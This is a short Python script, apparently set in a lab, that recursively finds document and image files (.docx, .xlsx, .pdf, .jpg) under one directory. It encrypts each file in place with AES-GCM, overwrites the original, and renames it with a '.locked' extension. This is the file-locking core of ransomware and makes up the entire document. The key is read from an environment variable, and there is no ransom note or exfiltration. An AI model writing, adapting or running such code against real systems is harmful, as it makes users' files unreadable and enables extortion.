from pathlib import Path
import os

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ROOT = Path("/srv/lab/incoming")
TARGET_SUFFIXES = {".docx", ".xlsx", ".pdf", ".jpg"}

def transform(path: Path, key: bytes) -> None:
    nonce = os.urandom(12)
    encrypted = AESGCM(key).encrypt(nonce, path.read_bytes(), None)
    # 直接改写原文件，再改变扩展名。
    path.write_bytes(nonce + encrypted)
    path.rename(path.with_name(path.name + ".locked"))

def process_tree() -> None:
    key = bytes.fromhex(os.environ["LAB_KEY_HEX"])
    for path in ROOT.rglob("*"):
        if path.is_file() and path.suffix.lower() in TARGET_SUFFIXES:
            transform(path, key)

if __name__ == "__main__":
    process_tree()
